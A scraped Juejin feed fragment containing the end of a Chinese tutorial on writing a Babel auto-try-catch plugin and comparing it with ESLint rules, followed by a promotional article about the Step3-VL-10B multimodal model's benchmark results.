        <span class="hljs-comment">// 核心逻辑：将函数体原来的内容，塞入 try 块中</span>
        
        <span class="hljs-comment">// 步骤 A: 生成 catch 子句的 error 参数节点 (identifier)</span>
        <span class="hljs-comment">// 使用 path.scope.generateUidIdentifier 防止变量名冲突 (例如防止用户原代码里已经有个变量叫 err)</span>
        <span class="hljs-keyword">const</span> errorParam = path.<span class="hljs-property">scope</span>.<span class="hljs-title function_">generateUidIdentifier</span>(<span class="hljs-string">'err'</span>);

        <span class="hljs-comment">// 步骤 B: 构建 catch 块的内容</span>
        <span class="hljs-comment">// 这里我们可以根据配置，生成 console.error 或 reportError 调用</span>
        <span class="hljs-keyword">const</span> reporterName = state.<span class="hljs-property">opts</span>.<span class="hljs-property">reporter</span> || <span class="hljs-string">'console.error'</span>;
        
        <span class="hljs-comment">// 使用 babel template 快速构建 AST 节点，比手动 t.callExpression 更直观</span>
        <span class="hljs-comment">// %%err%% 是占位符，会被替换为上面生成的 errorParam</span>
        <span class="hljs-keyword">const</span> catchBodyTemplate = template.<span class="hljs-title function_">statement</span>(<span class="hljs-string">`
          <span class="hljs-subst">${reporterName}</span>('Async Error:', %%err%%);
        `</span>);
        
        <span class="hljs-keyword">const</span> catchBlockStatement = t.<span class="hljs-title function_">blockStatement</span>([
          <span class="hljs-title function_">catchBodyTemplate</span>({ <span class="hljs-attr">err</span>: errorParam })
        ]);

        <span class="hljs-comment">// 步骤 C: 构建 catch 子句节点</span>
        <span class="hljs-keyword">const</span> catchClause = t.<span class="hljs-title function_">catchClause</span>(
          errorParam,
          catchBlockStatement
        );

        <span class="hljs-comment">// 步骤 D: 构建 try 语句节点</span>
        <span class="hljs-comment">// path.node.body 是 BlockStatement，包含 body 属性（语句数组）</span>
        <span class="hljs-keyword">const</span> originalBodyStatements = path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>;
        
        <span class="hljs-keyword">const</span> tryStatement = t.<span class="hljs-title function_">tryStatement</span>(
          t.<span class="hljs-title function_">blockStatement</span>(originalBodyStatements), <span class="hljs-comment">// try 块内容</span>
          catchClause, <span class="hljs-comment">// catch 块</span>
          <span class="hljs-literal">null</span> <span class="hljs-comment">// finally 块 (可选)</span>
        );

        <span class="hljs-comment">// 步骤 E: 替换原函数体</span>
        <span class="hljs-comment">// 注意：直接替换 body 可能会导致死循环（因为新生成的节点也包含函数体），</span>
        <span class="hljs-comment">// 但这里我们要替换的是 Function 的 body (BlockStatement) 的内容，</span>
        <span class="hljs-comment">// 或者直接替换 body 为包含 tryStatement 的新 BlockStatement。</span>
        
        path.<span class="hljs-title function_">get</span>(<span class="hljs-string">'body'</span>).<span class="hljs-title function_">replaceWith</span>(
          t.<span class="hljs-title function_">blockStatement</span>([tryStatement])
        );

        <span class="hljs-comment">// 标记该节点已被访问，避免递归处理死循环 (Babel 默认会重新访问新插入的节点)</span>
        path.<span class="hljs-title function_">skip</span>(); 
      }
    }
  };
};
</code></pre>
<h4 data-id="heading-9">2. 增强版 Babel 插件逻辑 (处理细节)</h4>
<p>上面的版本比较粗暴（把整个函数体包起来）。但在实际中，我们可能只想包裹包含 <code>await</code> 的代码段，或者如果用户已经写了部分 <code>try-catch</code> 该怎么办？</p>
<p>下面是更精细的 AST 操作逻辑：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 进阶工具函数：检查 BlockStatement 中是否包含 await 表达式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">hasAwaitExpression</span>(<span class="hljs-params">path</span>) {
  <span class="hljs-keyword">let</span> hasAwait = <span class="hljs-literal">false</span>;
  <span class="hljs-comment">// 使用 path.traverse 可以在当前路径下进行子遍历</span>
  path.<span class="hljs-title function_">traverse</span>({
    <span class="hljs-title class_">AwaitExpression</span>(childPath) {
      <span class="hljs-comment">// 必须确保 await 是属于当前函数的，而不是嵌套在内部其他 async 函数里的</span>
      <span class="hljs-keyword">const</span> parentFunction = childPath.<span class="hljs-title function_">getFunctionParent</span>();
      <span class="hljs-keyword">if</span> (parentFunction === path) {
        hasAwait = <span class="hljs-literal">true</span>;
        childPath.<span class="hljs-title function_">stop</span>(); <span class="hljs-comment">// 找到一个就停止</span>
      }
    },
    <span class="hljs-comment">// 防止遍历进入内部函数的陷阱</span>
    <span class="hljs-title class_">Function</span>(childPath) {
      childPath.<span class="hljs-title function_">skip</span>();
    }
  });
  <span class="hljs-keyword">return</span> hasAwait;
}

<span class="hljs-comment">// 修改 visitor 部分</span>
<span class="hljs-attr">visitor</span>: {
  <span class="hljs-title class_">Function</span>(path, state) {
    <span class="hljs-keyword">if</span> (!path.<span class="hljs-property">node</span>.<span class="hljs-property">async</span>) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 进阶优化：如果没有 await，其实不需要包裹 try-catch (虽然 async 函数报错会返回 reject promise，但这里假设只捕获 await 异常)</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">hasAwaitExpression</span>(path)) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// 处理 React/Vue 组件方法名排除</span>
    <span class="hljs-keyword">const</span> functionName = path.<span class="hljs-property">node</span>.<span class="hljs-property">id</span> ? path.<span class="hljs-property">node</span>.<span class="hljs-property">id</span>.<span class="hljs-property">name</span> : <span class="hljs-string">''</span>;
    <span class="hljs-keyword">if</span> ([<span class="hljs-string">'render'</span>, <span class="hljs-string">'setup'</span>, <span class="hljs-string">'componentDidCatch'</span>].<span class="hljs-title function_">includes</span>(functionName)) {
      <span class="hljs-keyword">return</span>;
    }
    
    <span class="hljs-comment">// ... 后续转换逻辑同上 ...</span>
  }
}
</code></pre>
<h4 data-id="heading-10">3. Babel 插件单元测试</h4>
<p>Babel 插件测试通常使用 <code>babel-plugin-tester</code> 或直接调用 <code>@babel/core</code> 的 <code>transformSync</code>。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> babel = <span class="hljs-built_in">require</span>(<span class="hljs-string">'@babel/core'</span>);
<span class="hljs-keyword">const</span> autoTryCatchPlugin = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./babel-plugin-auto-try-catch'</span>);
<span class="hljs-keyword">const</span> assert = <span class="hljs-built_in">require</span>(<span class="hljs-string">'assert'</span>);

<span class="hljs-comment">// 辅助测试函数</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">transform</span>(<span class="hljs-params">code, options = {}</span>) {
  <span class="hljs-keyword">const</span> result = babel.<span class="hljs-title function_">transformSync</span>(code, {
    <span class="hljs-attr">plugins</span>: [
      [autoTryCatchPlugin, options] <span class="hljs-comment">// 加载插件并传入配置</span>
    ],
    <span class="hljs-comment">// 禁用 Babel 默认生成严格模式，减少干扰</span>
    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">'script'</span>, 
    <span class="hljs-attr">compact</span>: <span class="hljs-literal">false</span> <span class="hljs-comment">// 格式化输出代码</span>
  });
  <span class="hljs-keyword">return</span> result.<span class="hljs-property">code</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'--- 开始测试 Babel 插件 ---'</span>);

<span class="hljs-comment">// 测试用例 1: 普通 Async 函数转换</span>
<span class="hljs-keyword">const</span> code1 = <span class="hljs-string">`
async function getData() {
  const res = await api.get('/user');
  return res;
}
`</span>;
<span class="hljs-keyword">const</span> output1 = <span class="hljs-title function_">transform</span>(code1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 1 Output]:\n'</span>, output1);
<span class="hljs-comment">/*
预期输出:
async function getData() {
  try {
    const res = await api.get('/user');
    return res;
  } catch (_err) {
    console.error('Async Error:', _err);
  }
}
*/</span>
assert.<span class="hljs-title function_">match</span>(output1, <span class="hljs-regexp">/try \{/</span>, <span class="hljs-string">'Case 1 Failed: try block missing'</span>);
assert.<span class="hljs-title function_">match</span>(output1, <span class="hljs-regexp">/catch \(_err\)/</span>, <span class="hljs-string">'Case 1 Failed: catch block missing'</span>);


<span class="hljs-comment">// 测试用例 2: 箭头函数转换</span>
<span class="hljs-keyword">const</span> code2 = <span class="hljs-string">`
const doWork = async () =&gt; {
  await sleep(1000);
  console.log('done');
};
`</span>;
<span class="hljs-keyword">const</span> output2 = <span class="hljs-title function_">transform</span>(code2);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 2 Output]:\n'</span>, output2);
assert.<span class="hljs-title function_">match</span>(output2, <span class="hljs-regexp">/try \{/</span>, <span class="hljs-string">'Case 2 Failed'</span>);


<span class="hljs-comment">// 测试用例 3: 已经有 Try-Catch 的函数 (应跳过)</span>
<span class="hljs-keyword">const</span> code3 = <span class="hljs-string">`
async function safe() {
  try {
    await risky();
  } catch (e) {
    handle(e);
  }
}
`</span>;
<span class="hljs-keyword">const</span> output3 = <span class="hljs-title function_">transform</span>(code3);
<span class="hljs-comment">// 输出应该和输入几乎一样（除了格式化差异）</span>
<span class="hljs-comment">// 我们通过判断 catch 块的数量来验证没有重复插入</span>
<span class="hljs-keyword">const</span> catchCount = (output3.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/catch/g</span>) || []).<span class="hljs-property">length</span>;
assert.<span class="hljs-title function_">strictEqual</span>(catchCount, <span class="hljs-number">1</span>, <span class="hljs-string">'Case 3 Failed: Should not add extra try-catch'</span>);


<span class="hljs-comment">// 测试用例 4: 自定义 Reporter 配置</span>
<span class="hljs-keyword">const</span> code4 = <span class="hljs-string">`async function test() { await fn(); }`</span>;
<span class="hljs-keyword">const</span> output4 = <span class="hljs-title function_">transform</span>(code4, { <span class="hljs-attr">reporter</span>: <span class="hljs-string">'window.reportToSentry'</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'[Case 4 Output]:\n'</span>, output4);
assert.<span class="hljs-title function_">match</span>(output4, <span class="hljs-regexp">/window\.reportToSentry/</span>, <span class="hljs-string">'Case 4 Failed: Custom reporter not working'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'--- 所有测试通过 ---'</span>);
</code></pre>
<hr/>
<h3 data-id="heading-11">第四部分：底层机制深度对比</h3>
<p>这部分解释为什么代码要这么写，这对于理解 1000 行级别的复杂插件开发至关重要。</p>
<h4 data-id="heading-12">1. 遍历机制：Scope (作用域) 管理</h4>
<p>这是 Babel 和 ESLint 插件开发中最难的部分。</p>
<ul>
<li>
<p><strong>ESLint</strong>:</p>
<ul>
<li><code>context.getScope()</code> 获取当前节点的作用域。</li>
<li>主要用于查找变量定义（References）。例如：<code>no-undef</code> 规则就是通过遍历 Scope 中的 references 列表，看是否有未定义的变量。</li>
<li>ESLint 的 Scope 分析是<strong>静态只读</strong>的。你不能在 lint 过程中修改 Scope。</li>
</ul>
</li>
<li>
<p><strong>Babel</strong>:</p>
<ul>
<li><code>path.scope</code> 对象非常强大。</li>
<li><code>path.scope.generateUidIdentifier('name')</code>：自动生成唯一变量名（如 <code>_name</code>, <code>_name2</code>），这在转换代码注入变量时必不可少（如上面 <code>try-catch</code> 中的 <code>err</code>）。</li>
<li><code>path.scope.push({ id: ... })</code>：可以将变量声明提升到作用域顶部。</li>
<li><strong>Binding</strong>：Babel 维护了极其详细的变量绑定信息。你可以通过 <code>path.scope.bindings['x']</code> 找到变量 <code>x</code> 的所有引用位置（<code>referencePaths</code>）和赋值位置（<code>constantViolations</code>）。这使得做“死代码消除”或“常量折叠”成为可能。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-13">2. 状态管理 (State)</h4>
<ul>
<li>
<p><strong>ESLint</strong>:</p>
<ul>
<li>状态通常保存在闭包变量中，或者 <code>create</code> 函数的局部变量中。</li>
<li>因为 ESLint 是按文件处理的，<code>create</code> 每次处理新文件都会重新执行，所以闭包变量是文件隔离的。</li>
<li>如果需要跨文件信息（极其少见且不推荐，因为破坏缓存），需要用到全局单例。</li>
</ul>
</li>
<li>
<p><strong>Babel</strong>:</p>
<ul>
<li>状态通过 <code>state</code> 参数在 Visitor 方法间传递。</li>
<li><code>state.file</code> 包含当前文件的元数据。</li>
<li><code>state.opts</code> 包含用户在 <code>.babelrc</code> 传入的插件配置。</li>
<li>可以在 <code>pre()</code> 和 <code>post()</code> 钩子中初始化和清理状态。</li>
</ul>
</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Babel 状态管理示例</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-title function_">pre</span>(<span class="hljs-params">state</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">cache</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(); <span class="hljs-comment">// 初始化文件级缓存</span>
  },
  <span class="hljs-attr">visitor</span>: {
    <span class="hljs-title class_">Identifier</span>(path, state) {
      <span class="hljs-comment">// this.cache 在这里可用</span>
    }
  },
  <span class="hljs-title function_">post</span>(<span class="hljs-params">state</span>) {
    <span class="hljs-comment">// 清理</span>
  }
};
</code></pre>
<h4 data-id="heading-14">3. 节点构造与替换</h4>
<ul>
<li>
<p><strong>ESLint Fixer</strong>:</p>
<ul>
<li>基于<strong>文本索引</strong>（Index）。</li>
<li>API: <code>replaceText(node, 'newText')</code>, <code>insertTextAfter(node, ';')</code>.</li>
<li>非常脆弱。如果你删除了一个逗号，可能导致后续的代码语法错误。ESLint 会尝试多次运行 fix 直到不再有变动，但它不保证生成的代码 AST 结构正确，只保证文本替换。</li>
</ul>
</li>
<li>
<p><strong>Babel Types</strong>:</p>
<ul>
<li>基于<strong>对象构建</strong>。</li>
<li>API: <code>t.binaryExpression('+', t.numericLiteral(1), t.numericLiteral(2))</code>。</li>
<li>非常健壮。只要符合 AST 规范，Babel Generator 就能生成合法的 JavaScript 代码（自动处理括号优先级、分号等）。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-15">总结</h3>
<ul>
<li>如果你的需求是 <strong>“阻止开发者提交烂代码”</strong> 或者 <strong>“统一团队的代码风格”</strong>，请选择 <strong>ESLint 插件</strong>。它的核心是 Context 和 Report。</li>
<li>如果你的需求是 <strong>“减少重复的样板代码”</strong>，<strong>“兼容低版本浏览器”</strong> 或者 <strong>“实现一种新的语法糖”</strong>，请选择 <strong>Babel 插件</strong>。它的核心是 Path、Visitor 和 Types Builder。</li>
</ul>
<p>以上代码展示了从零构建一个架构级 ESLint 规则和一个编译级 Babel 转换插件的完整过程，涵盖了 AST 分析、上下文判断、节点构建和单元测试等核心环节。在实际工程中，这两者往往结合使用：Babel 负责把代码变样，ESLint 负责保证变样前的源码符合规范。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谁说参数即正义？10B小钢炮Step3-VL硬刚千亿巨头]]></title>    <link>https://juejin.cn/post/7597679732364361770</link>    <guid>https://juejin.cn/post/7597679732364361770</guid>    <pubDate>2026-01-21T12:34:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597679732364361770" data-draft-id="7597679732364345386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谁说参数即正义？10B小钢炮Step3-VL硬刚千亿巨头"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-21T12:34:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谁说参数即正义？10B小钢炮Step3-VL硬刚千亿巨头
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:34:05.000Z" title="Wed Jan 21 2026 12:34:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在很长一段时间里，AI圈流行着一种近乎迷信的认知：大力出奇迹。想要更强的推理能力？加参数。想要看懂更复杂的图表？加参数。仿佛只要把显卡堆满，模型就能产生神迹。</p>
<p>但就在2026年开年，阶跃星辰（StepFun）甩出的这张王炸——<strong>Step3-VL-10B</strong>，狠狠地给了“参数至上论”一记耳光。</p>
<p>这就好比在一场重量级拳击赛里，一个轻量级选手不仅抗住了重量级拳王的进攻，还反手把对方KO了。这款仅有100亿参数的模型，在多项核心指标上，硬生生按住了参数量是它10倍甚至20倍的对手。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasdfgfdsgdf-1024x641.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asdfgfdsgdf-1024x641.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb14bcb18924c659bccb796f0f0d828~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=Jc2AKdWGYDrWLBM%2BHLP%2B4ibpQus%3D" alt="asdfgfdsgdf" loading="lazy"/></a></p>
<p><strong>小身板里的怪兽级性能</strong></p>
<p>咱们先不谈虚的，直接看数据。</p>
<p>通常来说，10B级别的模型只能算是“甜点级”，用来做做简单的对话或者跑在笔记本上玩玩。但Step3-VL-10B拿出的成绩单简直不讲武德。</p>
<p>在数学竞赛基准AIME 2025上，它拿下了94.43%的高分。作为对比，Qwen3-VL（235B参数）和Gemini 2.5 Pro这种巨无霸都在它身后吃灰。在考察STEM综合能力的MMMU评测中，它也以80.11%的成绩超越了GLM-4.6V（106B）。</p>
<p>这不仅是“越级挑战”，这简直是降维打击。如果不是白纸黑字的技术报告摆在那里，很难相信一个10B模型能在数学视觉推理（MathVision）和GUI交互能力上把千亿模型逼到墙角。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdasfds-1024x576.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdasfds-1024x576.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb061cbb17794a42a620feffb161a2d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=1bSJIsywkwlbtf7hg9ipOS9xhwc%3D" alt="asfdasfds" loading="lazy"/></a></p>
<p><strong>核心黑科技：它学会了“深思熟虑”</strong></p>
<p>这模型是吃了什么仙丹？答案是一个叫做 <strong>PaCoRe（并行协调推理）</strong> 的机制。</p>
<p>传统的模型推理大多是“直肠子”，给你一个问题，它基于当前的上下文顺着往下编，一条道走到黑。这种线性思维在处理复杂逻辑时很容易翻车，受限于上下文窗口，深度也有限。</p>
<p>Step3-VL-10B则不同。PaCoRe机制让它拥有了类似人类“系统2”的思考能力。当面对一个难题时，它不再急着给答案，而是瞬间在后台并行生成十几条甚至更多的推理轨迹。这就好比一个团队在头脑风暴，大家分头去试错、去验证，最后把所有线索汇总，合成一个最靠谱的结论。</p>
<p>通过这种“并行探索-协调合成”的方式，它在不增加上下文窗口的前提下，把有效推理计算量扩展到了百万Token级别。说白了，它用“更聪明的思考方式”弥补了“脑容量（参数）”的不足。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-21_20.22.05-1024x588.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-21_20.22.05-1024x588.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de89c85c647943c6aedd1938b7b90a91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=GROzGjcifXex8s3%2Fkms5FNb04cc%3D" alt="iShot_2026-01-21_20.22.05" loading="lazy"/></a></p>
<p><strong>炼丹炉里的秘密</strong></p>
<p>除了推理架构的革新，底层的功夫也没少下。阶跃星辰这次走的是“全参数端到端联合预训练”的路子。</p>
<p>很多多模态模型为了省事，视觉编码器是冻结的，相当于给大模型戴了副近视眼镜。而Step3-VL-10B是把视觉和语言部分全部解冻，放在1.2万亿高质量Token里一起炼。再加上超过1400轮的强化学习（RL Scaling），这让视觉信号和语言逻辑在底层就实现了真正的打通。</p>
<p><strong>这意味着什么？</strong></p>
<p>Step3-VL-10B的开源，对行业的影响可能比发一个超级大模型还要深远。</p>
<p>首先是<strong>端侧AI的春天</strong>。以前想要这种级别的多模态理解能力，你必须联网调API，因为手机跑不动千亿模型。现在，10B的体量完全有机会塞进高性能笔记本甚至未来的旗舰手机里。你的个人电脑可能很快就能读懂复杂的PDF文档、帮你操作GUI界面，而且完全本地化运行。</p>
<p>其次，它打破了<strong>成本壁垒</strong>。对于研究者和开发者来说，这就是一个现成的、高性能的、可微调的基座。你不需要数百万美元的算力集群，只用几张消费级显卡，就能在这个强力基线上跑出实际应用。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fsdfsaddrg-1024x981.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/sdfsaddrg-1024x981.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d63b86cdba24a84ae33159093db2fc6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769603645&amp;x-signature=%2B3xGOeiG%2F%2BtXXcQSx8Qe%2F3dEx3M%3D" alt="sdfsaddrg" loading="lazy"/></a></p>
<p><strong>总结</strong></p>
<p>阶跃星辰这次不仅是发布了一个模型，更像是验证了一条新路：与其无休止地堆砌参数，不如回头看看推理架构的效率。</p>
<p>当一个10B模型开始在AIME数学竞赛里碾压对手时，我们知道，AI进化的风向，变了。对于开发者而言，现在最大的建议就是：赶紧去Hugging Face下载权重，在你的显卡上跑起来试试。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
